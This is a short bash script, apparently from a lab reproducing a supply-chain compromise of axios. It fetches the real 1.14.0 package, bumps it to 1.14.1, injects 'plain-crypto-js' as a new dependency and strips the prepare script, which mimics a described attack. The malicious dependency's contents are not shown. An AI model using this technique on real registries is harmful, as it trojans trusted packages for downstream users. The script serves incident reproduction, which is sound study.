#!/bin/bash
# Downloads the REAL axios 1.14.0 (last clean version) and modifies it
# to inject plain-crypto-js as a dependency, exactly as the attacker did
# on March 31, 2026.

set -e

WORKDIR="$(pwd)/evil-axios"
mkdir -p "$WORKDIR"
cd "$WORKDIR"

echo "=== Downloading real axios 1.14.0 from npm public registry ==="
# We pull from the public registry ONCE, before redirecting npm to local Verdaccio.
# Use --registry to be explicit.
npm pack axios@1.14.0 --registry https://registry.npmjs.org

echo "=== Extracting tarball ==="
tar -xzf axios-1.14.0.tgz
mv package axios-source
rm axios-1.14.0.tgz

cd axios-source

echo "=== Original package.json dependencies ==="
node -e "console.log(JSON.stringify(require('./package.json').dependencies, null, 2))"

echo "=== Bumping version to 1.14.1 (mimicking the attacker) ==="
# Also remove the 'prepare' script. The real axios uses husky for git
# hooks (contributor tooling), which would otherwise run during publish
# and fail on machines that have not installed husky. The attacker had
# the real maintainer's environment, so this never fired for them.
node -e "
  const fs = require('fs');
  const pkg = require('./package.json');
  pkg.version = '1.14.1';
  pkg.dependencies = pkg.dependencies || {};
  pkg.dependencies['plain-crypto-js'] = '4.2.1';
  if (pkg.scripts && pkg.scripts.prepare) delete pkg.scripts.prepare;
  fs.writeFileSync('./package.json', JSON.stringify(pkg, null, 2));
"

echo "=== Modified package.json dependencies ==="
node -e "console.log(JSON.stringify(require('./package.json').dependencies, null, 2))"

echo ""
echo "=== Done ==="
echo "Source code of axios was NOT modified - only package.json."
echo "This mirrors exactly what the attacker did to plain-crypto-js."
